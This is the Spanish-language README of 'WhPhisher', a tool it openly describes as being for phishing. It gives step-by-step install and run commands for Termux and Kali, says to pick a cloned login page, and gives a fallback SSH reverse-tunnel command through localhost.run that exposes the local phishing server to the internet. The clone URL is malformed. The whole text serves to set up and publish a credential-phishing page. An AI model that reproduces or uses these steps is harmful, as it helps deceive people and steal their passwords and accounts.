# WhPhisher
Herramienta para hacer phishing con muchos
métodos de túneling

# Probado en:
Termux, Kali Linux y devian

# Como instalar

pkg install python3

pkg install git

git clone https://github/WhBeatZ/WhPhisher

cd WhPhisher

chmod +x *

python3 whphisher.py

[![Screenshot-20211228-113217.png](https://i.postimg.cc/zf6sY5Zz/Screenshot-20211228-113217.png)](https://postimg.cc/06GW7TyF)

Elegir la página y esperar a que inicie el túneling.

#Solucion_si_no_se_genera_link
Pasos:

Abrimos nueva sesión

cd

pkg install openssh -y

ssh -R 80:localhost:8080 nokey@localhost.run

